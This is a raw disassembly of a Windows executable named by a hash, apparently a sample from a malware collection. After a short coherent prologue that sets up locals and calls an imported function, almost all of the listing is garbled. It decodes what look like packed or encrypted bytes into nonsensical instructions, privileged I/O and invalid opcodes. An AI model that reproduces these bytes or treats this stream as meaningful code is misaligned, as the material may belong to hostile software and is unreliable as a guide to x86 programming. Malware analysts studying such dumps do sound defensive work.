
7cf3e9f95911c9fffb5e67d17b9b037531255fd0893de8bde13afcb7d2661534.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	xor    BYTE PTR [esp+edi*2+0x7b],0x9
  401100:	int3   
  401101:	jae    0x4010d1
  401103:	jae    0x401147
  401105:	mov    bl,0x35
  401107:	iret   
  401108:	adc    eax,0x475291d0
  40110d:	nop
  40110e:	add    edx,DWORD PTR [eax+0x16082e3]
  401114:	int    0x36
  401116:	sub    BYTE PTR ds:0x9a97ee4c,0x31
  40111d:	jnp    0x401116
  40111f:	lds    edi,FWORD PTR [eax-0x33]
  401122:	fwait
  401123:	push   edx
  401124:	pop    ebp
  401125:	add    eax,0xfc28083b
  40112a:	pop    ebp
  40112b:	or     eax,0xe49258
  401130:	shr    BYTE PTR gs:[ebx],1
  401133:	loopne 0x401141
  401135:	in     eax,0x83
  401137:	loop   0x4010d0
  401139:	mov    edx,0x3b9d8334
  40113e:	inc    esp
  40113f:	jl     0x4011bc
  401141:	push   eax
  401142:	mov    dh,0x9a
  401144:	sbb    BYTE PTR ds:[ecx+ebx*2],0xa8
  401149:	fcomp  DWORD PTR [edx-0x5c]
  40114c:	ins    DWORD PTR es:[edi],dx
  40114d:	ss xchg esp,eax
  40114f:	mov    eax,ds:0x21b539b2
  401154:	aas    
  401155:	std    
  401156:	shl    DWORD PTR [esi+0x29efdc0e],cl
  40115c:	and    ch,BYTE PTR [esi]
  40115e:	xor    al,0x5d
  401160:	xor    cl,ch
  401162:	into   
  401163:	shr    BYTE PTR [edx+0x584d68b2],0xa1
  40116a:	stc    
  40116b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40116c:	jbe    0x4011b5
  40116e:	and    BYTE PTR [ecx-0x350ee7e0],dl
  401174:	mov    al,0x27
  401176:	adc    cl,BYTE PTR [ecx-0x2bd2609e]
  40117c:	dec    esi
  40117d:	fs aam 0x94
  401180:	adc    al,0xd1
  401182:	call   0x66373263
  401187:	aas    
  401188:	pusha  
  401189:	jle    0x40110b
  40118b:	xor    ah,BYTE PTR [esi-0x68e136fc]
  401191:	sub    eax,0x30766669
  401196:	fadd   DWORD PTR [edi]
  401198:	sbb    BYTE PTR [edi],0x97
  40119b:	(bad)  
  40119c:	xchg   esp,eax
  40119d:	or     al,0xb3
  40119f:	scas   eax,DWORD PTR es:[edi]
  4011a0:	cmp    esp,edx
  4011a2:	pop    es
  4011a3:	add    eax,DWORD PTR [esi-0x4e]
  4011a6:	and    al,0x6f
  4011a8:	repz inc ebp
  4011ab:	jle    0x4011bf
  4011ad:	add    al,0x18
  4011af:	xchg   DWORD PTR [eax+eiz*2],ecx
  4011b2:	mov    esp,0xc26c8fe2
  4011b7:	retf   0xb33c
  4011ba:	pusha  
  4011bb:	pushf  
  4011bc:	ret    0x6fa
  4011bf:	mov    bl,0x7d
  4011c1:	mov    al,0x4b
  4011c3:	out    dx,al
  4011c4:	adc    DWORD PTR [edi+edx*8-0x25a3de07],esp
  4011cb:	pop    edi
  4011cc:	jmp    0x4011e9
  4011ce:	clc    
  4011cf:	xchg   ecx,eax
  4011d0:	in     al,0x9d
  4011d2:	shl    ecx,0x6
  4011d5:	imul   edi
  4011d7:	jmp    0x40117d
  4011d9:	mov    bh,0xe2
  4011db:	iret   
  4011dc:	dec    ebx
  4011dd:	jmp    0xd70d5adf
  4011e2:	icebp  
  4011e3:	push   eax
  4011e4:	xchg   ebx,eax
  4011e5:	hlt    
  4011e6:	mov    ch,0xe4
  4011e8:	shr    BYTE PTR [esi-0x32],0x63
  4011ec:	mov    eax,ds:0xbfcb354f
  4011f1:	aam    0x4e
  4011f3:	fst    st(4)
  4011f5:	or     ah,dh
  4011f7:	pop    edi
  4011f8:	add    dh,BYTE PTR [edx+0x56adde00]
  4011fe:	adc    ch,bl
  401200:	out    dx,al
  401201:	scas   al,BYTE PTR es:[edi]
  401202:	mov    ?,edi
  401204:	inc    eax
  401205:	push   ebx
  401206:	(bad)  [ebp-0x2e90fbf]
  40120c:	sub    edi,DWORD PTR [eax+eax*1+0x65]
  401210:	sub    dh,BYTE PTR [edi+0x6b]
  401213:	pop    ds
  401214:	aad    0xda
  401216:	xor    BYTE PTR [ebp+0x2b69abb1],cl
  40121c:	add    BYTE PTR [ebx],0xcd
  40121f:	shr    al,1
  401221:	imul   edi,DWORD PTR [edi+0x57d7b36d],0x4c
  401228:	jmp    0x7f7f4cc4
  40122d:	fcomp  st(3)
  40122f:	pop    ds
  401230:	push   ds
  401231:	adc    al,0x6b
  401233:	or     edi,edi
  401235:	(bad)  
  401236:	cld    
  401237:	aam    0x1
  401239:	or     BYTE PTR [ebx+0x747afaae],dl
  40123f:	imul   eax,DWORD PTR [ebx+ebx*4-0x22],0x43
  401244:	js     0x401221
  401246:	mov    ch,0x88
  401248:	and    ch,al
  40124a:	(bad)  
  40124b:	jb     0x4011f4
  40124d:	or     cl,BYTE PTR [esi+eiz*1-0x43]
  401251:	jnp    0x401258
  401253:	lahf   
  401254:	(bad)  
  401255:	test   eax,0xbc19a617
  40125a:	and    DWORD PTR [ebp-0x1b9f35c8],0x19
  401261:	lods   al,BYTE PTR ds:[esi]
  401262:	cmp    DWORD PTR [esi],esp
  401264:	inc    ebp
  401265:	cmovg  ebp,DWORD PTR [eax+0x1b]
  401269:	pop    ecx
  40126a:	mov    bl,0x7a
  40126c:	jmp    0x62d:0xec55227f
  401273:	mov    eax,0xaf3274d9
  401278:	in     eax,0x51
  40127a:	out    0x4,al
  40127c:	cmc    
  40127d:	fisub  DWORD PTR ds:0x116b721
  401283:	pop    es
  401284:	int    0x2a
  401286:	dec    ecx
  401287:	dec    ebx
  401288:	xor    al,0xb6
  40128a:	adc    ch,BYTE PTR [edi-0x1a]
  40128d:	jmp    0x723a9ab9
  401292:	lock inc esi
  401294:	cmp    edi,DWORD PTR [esi]
  401296:	xor    BYTE PTR [ebp+0x792264de],dh
  40129c:	lea    eax,[eax+0x63]
  40129f:	pushf  
  4012a0:	(bad)  
  4012a1:	mov    cl,0x32
  4012a3:	xchg   BYTE PTR [ebp+0x57f260aa],ah
  4012a9:	ins    BYTE PTR es:[edi],dx
  4012aa:	mov    esi,0xe7f7d6cb
  4012af:	pop    edi
  4012b0:	push   eax
  4012b1:	fs lahf 
  4012b3:	addr16 in al,dx
  4012b5:	pop    ebp
  4012b6:	ins    DWORD PTR es:[edi],dx
  4012b7:	popf   
  4012b8:	or     al,0x19
  4012ba:	inc    ebp
  4012bb:	pop    edx
  4012bc:	xor    esi,esp
  4012be:	daa    
  4012bf:	(bad)  
  4012c0:	shl    BYTE PTR [ecx],cl
  4012c2:	cmp    eax,0x7ae5853c
  4012c7:	pop    esp
  4012c8:	pusha  
  4012c9:	push   edx
  4012ca:	fs data16 jecxz 0x40133d
  4012ce:	pop    esi
  4012cf:	jno    0x40132b
  4012d1:	fwait
  4012d2:	aaa    
  4012d3:	cld    
  4012d4:	in     eax,0x37
  4012d6:	xor    al,0x95
  4012d8:	ja     0x4012c1
  4012da:	loope  0x401282
  4012dc:	inc    esi
  4012dd:	xchg   esp,eax
  4012de:	adc    al,0x1b
  4012e0:	repz fucom st(2)
  4012e3:	ret    0x6dac
  4012e6:	retf   0xb69d
  4012e9:	jp     0x401305
  4012eb:	nop
  4012ec:	jae    0x4012ad
  4012ee:	inc    edx
  4012ef:	je     0x401352
  4012f1:	js     0x4012ac
  4012f3:	fisttp WORD PTR [ecx]
  4012f5:	call   0x75e3afb6
  4012fa:	jl     0x40134c
  4012fc:	loopne 0x4012a8
  4012fe:	jge    0x401333
  401300:	or     BYTE PTR [ecx-0x1a4d6343],dl
  401306:	into   
  401307:	adc    al,0xe6
  401309:	pop    ebp
  40130a:	and    BYTE PTR [eax-0x41],bh
  40130d:	jno    0x40136f
  40130f:	and    BYTE PTR [edx-0x40],0x8c
  401313:	and    ebp,DWORD PTR [ebp-0x179ead55]
  401319:	(bad)  
  40131a:	mov    esi,0xf5b88162
  40131f:	lods   eax,DWORD PTR ds:[esi]
  401320:	ins    DWORD PTR es:[edi],dx
  401321:	es jmp 0x5469ff81
  401327:	test   cl,ah
  401329:	je     0x4013a4
  40132b:	push   esp
  40132c:	fnstcw WORD PTR [eax-0x62]
  40132f:	fprem  
  401331:	(bad)  [eax-0x587268ef]
  401337:	sar    al,0xdd
  40133a:	mov    ah,BYTE PTR [ecx-0x7f70b8b4]
  401340:	mov    cs,WORD PTR [ecx-0x33]
  401343:	cmp    ch,BYTE PTR [edx-0x74eb5cc9]
  401349:	into   
  40134a:	js     0x40138f
  40134c:	push   edi
  40134d:	inc    ebp
  40134e:	and    al,0x69
  401350:	(bad)  
  401351:	dec    edi
  401352:	fdiv   DWORD PTR [eax-0x4fdb1938]
  401358:	jg     0x4013c3
  40135a:	popf   
  40135b:	or     DWORD PTR [ecx+0x3cbd2f24],esp
  401361:	cdq    
  401362:	cmc    
  401363:	cs nop
  401365:	adc    ebp,DWORD PTR [ebx+0x5c]
  401368:	std    
  401369:	pop    esi
  40136a:	test   al,0xf4
  40136c:	push   es
  40136d:	mov    bh,bh
  40136f:	lahf   
  401370:	sub    DWORD PTR [ecx],esi
  401372:	jp     0x4013bb
  401374:	inc    ebp
  401375:	loop   0x40137f
  401377:	loopne 0x4013ec
  401379:	inc    esi
  40137a:	test   bl,ch
  40137c:	push   ebp
  40137d:	sbb    esi,0xffffffc0
  401380:	ret    
  401381:	inc    ecx
  401382:	add    DWORD PTR [eax],ebp
  401384:	stc    
  401385:	inc    edx
  401386:	sbb    DWORD PTR [esi+0x2d],ebp
  401389:	(bad)  
  40138a:	ins    BYTE PTR es:[edi],dx
  40138b:	sbb    al,0xa3
  40138d:	and    BYTE PTR [edi-0x482bb9ad],ah
  401393:	popa   
  401394:	jns    0x40132f
  401396:	lahf   
  401397:	mov    ebp,0x666a1fdf
  40139c:	ret    0x2d6b
  40139f:	nop
  4013a0:	pop    eax
  4013a1:	xchg   BYTE PTR [ecx+0xb],dh
  4013a4:	rcl    DWORD PTR ds:0x43cbbf36,1
  4013aa:	sbb    cl,al
  4013ac:	xor    ebp,ebp
  4013ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013af:	sbb    DWORD PTR [esi+0x4e2dca],ecx
  4013b5:	mov    bl,0x75
  4013b7:	sub    ebx,DWORD PTR [edi+edx*1+0x18]
  4013bb:	jb     0x4013c9
  4013bd:	outs   dx,BYTE PTR ds:[esi]
  4013be:	mov    ebx,0x53ced72f
  4013c3:	mov    ecx,0x4123ac3b
  4013c8:	cwde   
  4013c9:	pop    esp
  4013ca:	mov    ds:0x9ee07092,eax
  4013cf:	(bad)  
  4013d0:	cmp    bh,BYTE PTR [esi-0x57f1a854]
  4013d6:	or     eax,0x648e9c63
  4013db:	std    
  4013dc:	mov    eax,0x8a3a01c4
  4013e1:	loop   0x4013fb
  4013e3:	xchg   BYTE PTR [ebx],al
  4013e5:	adc    al,0x88
  4013e7:	jne    0x401371
  4013e9:	outs   dx,DWORD PTR ds:[esi]
  4013ea:	sub    ebp,DWORD PTR [esi-0x4d61ef53]
  4013f0:	mov    ecx,0xf6316b7a
  4013f5:	inc    ebx
  4013f6:	push   ebx
  4013f7:	jp     0x401419
  4013f9:	cmp    BYTE PTR [edx+0x58],ch
  4013fc:	je     0x401444
  4013fe:	and    esi,DWORD PTR [ecx+0x549f2b53]
  401404:	sbb    ebx,edx
  401406:	sti    
  401407:	shr    DWORD PTR [esi+edi*1+0x60b07438],0xc8
  40140f:	es loope 0x40144e
  401412:	sub    edi,esp
  401414:	dec    eax
  401415:	cmp    edx,DWORD PTR [edx+0x2f77d903]
  40141b:	shr    BYTE PTR [ebx+0x2a],0xcc
  40141f:	adc    eax,0xadd9ca71
  401424:	or     dl,al
  401426:	rol    al,cl
  401428:	unpcklps xmm1,xmm0
  40142b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40142c:	call   FWORD PTR [ebp-0x1774a756]
  401432:	jl     0x40146b
  401434:	popf   
  401435:	mov    bl,0xc5
  401437:	sahf   
  401438:	mov    bh,0x69
  40143a:	mov    dh,bh
  40143c:	and    edi,DWORD PTR gs:[edi+0x47903fd1]
  401443:	rcl    BYTE PTR [eax-0x80],1
  401446:	or     ah,BYTE PTR [ebp+0xb]
  401449:	xchg   ebx,eax
  40144a:	lahf   
  40144b:	cmc    
  40144c:	js     0x401434
  40144e:	sbb    cl,BYTE PTR [ebx-0x4e]
  401451:	mov    ds:0xef506d97,eax
  401456:	pop    eax
  401457:	push   edi
  401458:	dec    esp
  401459:	stos   DWORD PTR es:[edi],eax
  40145a:	repnz std 
  40145c:	or     DWORD PTR [edx+0x13],edx
  40145f:	stc    
  401460:	inc    esp
  401461:	cmp    ebp,ebx
  401463:	aaa    
  401464:	repz xchg ecx,eax
  401466:	mov    bh,0xf0
  401468:	dec    edx
  401469:	adc    ecx,eax
  40146b:	add    bh,BYTE PTR [ecx]
  40146d:	push   0x3
  40146f:	inc    edx
  401470:	mov    ecx,0xaa472bd4
  401475:	(bad)  
  401476:	loopne 0x401488
  401478:	sub    edi,DWORD PTR [ebp-0x8]
  40147b:	and    eax,0x966e8fde
  401480:	dec    edx
  401481:	stos   BYTE PTR es:[edi],al
  401482:	xor    eax,0x4ae6043a
  401487:	sub    dl,BYTE PTR [esi+0x612cc3d8]
  40148d:	pop    ss
  40148e:	mov    dl,BYTE PTR [eax]
  401490:	push   esp
  401491:	aas    
  401492:	sar    DWORD PTR [eax+0x73adb0fc],0x83
  401499:	ficom  DWORD PTR [edx]
  40149b:	arpl   WORD PTR [edx],bx
  40149d:	popf   
  40149e:	and    al,0x64
  4014a0:	inc    ebx
  4014a1:	mov    eax,ds:0xbb743bc4
  4014a6:	loop   0x401515
  4014a8:	sub    BYTE PTR [ebp-0x46],0xf5
  4014ac:	aas    
  4014ad:	pop    esi
  4014ae:	mov    BYTE PTR cs:[edx-0x13],al
  4014b2:	cmp    eax,0x185a56c9
  4014b7:	pop    eax
  4014b8:	mov    ebx,0xebebbd9d
  4014bd:	mov    ecx,0x9e0419bb
  4014c2:	aas    
  4014c3:	loope  0x401481
  4014c5:	pusha  
  4014c6:	into   
  4014c7:	mov    bl,cl
  4014c9:	repz jbe 0x401491
  4014cc:	imul   esp,DWORD PTR [ebx+esi*4+0x30],0xbcda2ab
  4014d4:	add    bl,dl
  4014d6:	fnstcw WORD PTR [ebx-0x18797389]
  4014dc:	xor    bl,BYTE PTR [ebx-0x1ddbf090]
  4014e2:	pop    edi
  4014e3:	jns    0x4014f5
  4014e5:	shl    DWORD PTR [ebp+0x1b],cl
  4014e8:	pop    ss
  4014e9:	push   esp
  4014ea:	lea    edx,ds:0x43a48e96
  4014f0:	push   ecx
  4014f1:	mov    ds:0x36b77f1e,al
  4014f6:	inc    eax
  4014f7:	cwde   
  4014f8:	sbb    DWORD PTR [ebp-0x80],ebx
  4014fb:	sbb    eax,ebp
  4014fd:	mov    esi,0xcced1c80
  401502:	dec    ebx
  401503:	lea    esi,ds:0xad86ff75
  401509:	and    DWORD PTR [edx-0x77],esp
  40150c:	test   DWORD PTR [edi],ecx
  40150e:	inc    edx
  40150f:	out    0xb,al
  401511:	loopne 0x4014ea
  401513:	mov    BYTE PTR [edx+0x6b519f3],cl
  401519:	dec    eax
  40151a:	enter  0x1c97,0x3c
  40151e:	add    eax,0x59533edc
  401523:	sub    eax,0x20530585
  401528:	iret   
  401529:	aam    0xb1
  40152b:	push   esp
  40152c:	mov    dh,0xd1
  40152e:	xchg   edi,eax
  40152f:	bound  ecx,QWORD PTR [edx]
  401531:	test   edi,eax
  401533:	sub    dh,BYTE PTR [edi]
  401535:	arpl   WORD PTR [ebp-0x78],di
  401538:	popa   
  401539:	lods   al,BYTE PTR ds:[esi]
  40153a:	pop    ecx
  40153b:	and    dh,al
  40153d:	test   ecx,esp
  40153f:	cmp    DWORD PTR [edi-0x351d7744],ebp
  401545:	jne    0x40156a
  401547:	pop    ds
  401548:	jg     0x401512
  40154a:	dec    eax
  40154b:	pop    eax
  40154c:	adc    esi,edx
  40154e:	retf   0x1c41
  401551:	mov    ch,0x27
  401553:	pop    edx
  401554:	sbb    bh,BYTE PTR [edi+eiz*1-0x4d]
  401558:	(bad)  
  401559:	jno    0x40155f
  40155b:	mov    cl,0x44
  40155d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40155e:	ja     0x40158f
  401560:	pop    esi
  401561:	dec    edx
  401562:	pop    edx
  401563:	mov    dh,0xc6
  401565:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  401567:	clc    
  401568:	dec    edx
  401569:	jae    0x401555
  40156b:	dec    esi
  40156c:	add    al,0xab
  40156e:	std    
  40156f:	(bad)  
  401570:	adc    edi,esi
  401572:	loopne 0x4014f5
  401574:	stc    
  401575:	cmp    al,0x53
  401577:	shl    bh,1
  401579:	pop    ds
  40157a:	jp     0x40152c
  40157c:	add    cl,BYTE PTR [edx+0x2175f35e]
  401582:	adc    al,0x19
  401584:	sub    DWORD PTR [edi],ebp
  401586:	hlt    
  401587:	xchg   ebx,eax
  401588:	outs   dx,DWORD PTR fs:[esi]
  40158a:	sub    eax,0x32f30c64
  40158f:	leave  
  401590:	or     eax,0xbb6b0066
  401595:	(bad)  [ebp+0xd]
  401598:	inc    esi
  401599:	(bad)  
  40159a:	jmp    0x7f6ce195
  40159f:	shl    DWORD PTR [eax+0x742c1c7],1
  4015a5:	int    0x35
  4015a7:	jecxz  0x40158c
  4015a9:	lods   eax,DWORD PTR ds:[esi]
  4015aa:	repz mov ebp,?
  4015ad:	xlat   BYTE PTR ds:[ebx]
  4015ae:	(bad)  
  4015af:	pop    ss
  4015b0:	xchg   edi,eax
  4015b1:	cli    
  4015b2:	pop    ds
  4015b3:	aaa    
  4015b4:	jno    0x4015c8
  4015b6:	jnp    0x4015d5
  4015b8:	ja     0x401568
  4015ba:	mov    bh,0xaf
  4015bc:	push   ss
  4015bd:	stos   BYTE PTR es:[edi],al
  4015be:	(bad)  
  4015bf:	retf   
  4015c0:	xor    bl,BYTE PTR [ebx-0x43]
  4015c3:	jl     0x4015f1
  4015c5:	shl    BYTE PTR [edx],1
  4015c7:	mov    dl,0xb8
  4015c9:	lods   eax,DWORD PTR ds:[esi]
  4015ca:	ins    DWORD PTR es:[edi],dx
  4015cb:	(bad)  
  4015cc:	sub    eax,0xf5002622
  4015d1:	pop    es
  4015d2:	sbb    BYTE PTR [esi-0x4a],al
  4015d5:	inc    edi
  4015d6:	jne    0x40162c
  4015d8:	ins    BYTE PTR es:[edi],dx
  4015d9:	xchg   esi,eax
  4015da:	aaa    
  4015db:	(bad)  
  4015dc:	mov    eax,0xded25acb
  4015e1:	ja     0x4015b4
  4015e3:	fld    DWORD PTR [ebx]
  4015e5:	adc    BYTE PTR [esi-0x488b9090],al
  4015eb:	iret   
  4015ec:	scas   eax,DWORD PTR es:[edi]
  4015ed:	(bad)  
  4015ee:	push   edx
  4015ef:	cwde   
  4015f0:	add    DWORD PTR [ebp+0x7],ebp
  4015f3:	push   ss
  4015f4:	jge    0x401599
  4015f6:	retf   0x61f0
  4015f9:	cs nop
  4015fb:	pop    esi
  4015fc:	push   ds
  4015fd:	test   BYTE PTR [edi+0x28f01ae0],0xba
  401604:	xlat   BYTE PTR ds:[ebx]
  401605:	xor    eax,0xb16b804
  40160a:	out    dx,eax
  40160b:	loope  0x4015fb
  40160d:	retf   0xcf80
  401610:	pop    esp
  401611:	enter  0xc57c,0x76
  401615:	jno    0x401678
  401617:	xchg   esi,eax
  401618:	shl    DWORD PTR [ebp+eiz*2+0xb],cl
  40161c:	mov    cl,0x56
  40161e:	test   eax,0x26177e5a
  401623:	outs   dx,DWORD PTR ds:[esi]
  401624:	jg     0x4015cf
  401626:	sub    al,0xd5
  401628:	inc    ecx
  401629:	adc    al,0xe0
  40162b:	mov    eax,ds:0xb0a6ba62
  401630:	push   ebx
  401631:	mov    esi,0x79ec492b
  401636:	and    dh,dl
  401638:	inc    eax
  401639:	sbb    cl,bl
  40163b:	push   esi
  40163c:	jno    0x401677
  40163e:	jnp    0x40165d
  401640:	mov    ch,0xb5
  401642:	iret   
  401643:	mov    cl,0x5c
  401645:	fisttp WORD PTR [ebx+ebp*8-0x4ace0929]
  40164c:	dec    esp
  40164d:	shl    esi,cl
  40164f:	dec    cx
  401651:	fistp  DWORD PTR [ecx-0x55]
  401654:	add    BYTE PTR [edi+eax*1-0xe],dh
  401658:	mov    dh,0x7c
  40165a:	jmp    0xf26c1457
  40165f:	cmp    BYTE PTR [edx+0x5b51fd],0x53
  401666:	pop    eax
  401667:	xor    DWORD PTR [ebp+0x6dc956b4],edi
  40166d:	and    BYTE PTR [ecx-0x71],ah
  401670:	adc    esp,ecx
  401672:	adc    BYTE PTR [ecx-0x2509d9c5],bl
  401678:	push   0x2a4ad046
  40167d:	xor    al,bl
  40167f:	xchg   ebp,eax
  401680:	into   
  401681:	jnp    0x401701
  401683:	push   0xdaecbe1c
  401688:	mov    ecx,0xb85ff25d
  40168d:	cmp    BYTE PTR [eax-0x7a],ch
  401690:	mov    bl,0xd3
  401692:	fs (bad) 
  401694:	loop   0x401666
  401696:	pushf  
  401697:	jne    0x401658
  401699:	jl     0x4016cd
  40169b:	mov    esp,0x35ed69a
  4016a0:	data16 mov bl,0xd3
  4016a3:	dec    edx
  4016a4:	icebp  
  4016a5:	mov    edx,0x5d19daf0
  4016aa:	ret    0x3709
  4016ad:	std    
  4016ae:	ficomp DWORD PTR [ebx+0x361aa686]
  4016b4:	call   0xa713:0xcd735200
  4016bb:	aad    0x2f
  4016bd:	repz dec edx
  4016bf:	add    al,0xb4
  4016c1:	sub    eax,0xc208de2a
  4016c6:	test   edi,esi
  4016c8:	and    eax,0xb4a8e09
  4016cd:	xor    ch,ah
  4016cf:	sub    al,0xc2
  4016d1:	clc    
  4016d2:	mov    al,0xce
  4016d4:	fbstp  TBYTE PTR [edx-0x3013ea4]
  4016da:	xor    DWORD PTR [ebp-0x5c5fa049],0x4e
  4016e1:	adc    bl,BYTE PTR [ebp-0x51d59a7a]
  4016e7:	ins    DWORD PTR es:[edi],dx
  4016e8:	mov    edx,0xb122a21c
  4016ed:	fdiv   DWORD PTR [esi]
  4016ef:	bound  ebp,QWORD PTR [esi]
  4016f1:	mov    esi,0x7928ff4c
  4016f6:	(bad)  
  4016f7:	scas   eax,DWORD PTR es:[edi]
  4016f8:	pop    ebp
  4016f9:	(bad)  
  4016fa:	mov    cl,0xce
  4016fc:	mov    bl,0xa1
  4016fe:	cwde   
  4016ff:	lea    esi,[edi]
  401701:	test   esi,esp
  401703:	fs sahf 
  401705:	xchg   ebp,eax
  401706:	popa   
  401707:	mov    dh,0x82
  401709:	loopne 0x401738
  40170b:	adc    BYTE PTR [ebp-0x7c313226],bh
  401711:	pop    ebp
  401712:	arpl   si,cx
  401714:	lea    eax,[edx+0x46]
  401717:	ficom  DWORD PTR [edi+esi*4]
  40171a:	aas    
  40171b:	test   BYTE PTR [edx-0x7e08d7b0],cl
  401721:	call   0x26fe:0xf9fe148d
  401728:	xchg   edi,eax
  401729:	adc    DWORD PTR [ecx-0x3c7dbb6a],ebx
  40172f:	mov    ebp,0xe2280390
  401734:	sub    eax,0xa9bfbd3
  401739:	int    0x6c
  40173b:	repnz xchg edi,eax
  40173d:	push   ds
  40173e:	mov    ebx,0x5e9a9ede
  401743:	(bad)  [edi]
  401745:	fisubr WORD PTR [esi+edx*8+0xb]
  401749:	jge    0x4017ac
  40174b:	fadd   DWORD PTR [ecx-0x18]
  40174e:	dec    eax
  40174f:	imul   ebp,DWORD PTR [edi],0x2b6f16e8
  401755:	mov    WORD PTR [ebx],ds
  401757:	(bad)  
  401758:	mov    eax,0xf412c733
  40175d:	or     ebx,edi
  40175f:	in     al,0x52
  401761:	repnz mov fs,WORD PTR [eax]
  401764:	in     eax,dx
  401765:	or     DWORD PTR [ecx+edx*1-0x5d1480b0],ecx
  40176c:	mov    ebp,0x988372ed
  401771:	mov    ecx,0x34e1c2d5
  401776:	retf   0xcdd5
  401779:	int3   
  40177a:	pop    es
  40177b:	out    0x44,al
  40177d:	mov    ebp,0x6dc69276
  401782:	fucom  st(6)
  401784:	mov    esp,0x89d5c7eb
  401789:	ins    BYTE PTR es:[edi],dx
  40178a:	in     eax,0x5a
  40178c:	add    DWORD PTR [ecx-0x202b25a5],esp
  401792:	out    dx,eax
  401793:	pop    ds
  401794:	daa    
  401795:	adc    esi,DWORD PTR [edi-0x3f4bdfb2]
  40179b:	push   eax
  40179c:	call   0xc431:0x18d20c7f
  4017a3:	mov    bl,0xb1
  4017a5:	lock cmp BYTE PTR [eax+esi*1+0x220070aa],0x7e
  4017ae:	add    BYTE PTR [eax+0x51],dl
  4017b1:	mov    edx,0xa035b198
  4017b6:	sub    bh,0xb7
  4017b9:	jmp    0xbb9d:0x5eb85fa6
  4017c0:	ret    
  4017c1:	lock and esp,ecx
  4017c4:	es push ss
  4017c6:	cmp    al,0x57
  4017c8:	push   ss
  4017c9:	lods   eax,DWORD PTR ds:[esi]
  4017ca:	and    ecx,esp
  4017cc:	inc    ebx
  4017cd:	loopne 0x4017a0
  4017cf:	and    edx,ebp
  4017d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d2:	push   ebx
  4017d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d4:	popf   
  4017d5:	int3   
  4017d6:	dec    eax
  4017d7:	or     eax,0x171f4463
  4017dc:	(bad)  
  4017dd:	pandn  mm2,QWORD PTR [edi-0x2d42eed]
  4017e4:	int3   
  4017e5:	pop    es
  4017e6:	repz jns 0x4017d5
  4017e9:	push   0x1e20dce3
  4017ee:	sub    BYTE PTR [ebx-0x7c6bbbcc],0xb9
  4017f5:	or     DWORD PTR [ecx],ebx
  4017f7:	inc    ebp
  4017f8:	dec    eax
  4017f9:	inc    esp
  4017fa:	dec    edx
  4017fb:	or     eax,0x3b1448eb
  401800:	push   ecx
  401801:	scas   eax,DWORD PTR es:[edi]
  401802:	into   
  401803:	fwait
  401804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401805:	aaa    
  401806:	push   edx
  401807:	fisubr DWORD PTR [ecx+eax*1+0x2f252df6]
  40180e:	inc    esi
  40180f:	pusha  
  401810:	mov    dh,0x8d
  401812:	sbb    ah,BYTE PTR [edi-0x12]
  401815:	xchg   edi,eax
  401816:	cdq    
  401817:	or     dh,BYTE PTR [edx+ecx*4]
  40181a:	stos   BYTE PTR es:[edi],al
  40181b:	popa   
  40181c:	jne    0x40187f
  40181e:	repnz repnz xchg esp,eax
  401821:	mov    cl,0x0
  401823:	mov    al,ds:0x3873bb8f
  401828:	pop    ds
  401829:	shr    dh,1
  40182b:	jae    0x401864
  40182d:	sbb    DWORD PTR [edi-0x62b1f2f4],0xffffffed
  401834:	test   edi,eax
  401836:	lods   eax,DWORD PTR ds:[esi]
  401837:	ficom  WORD PTR [edi+0x298a405c]
  40183d:	mov    bl,0xa0
  40183f:	lock xor DWORD PTR [edx-0x23],ebx
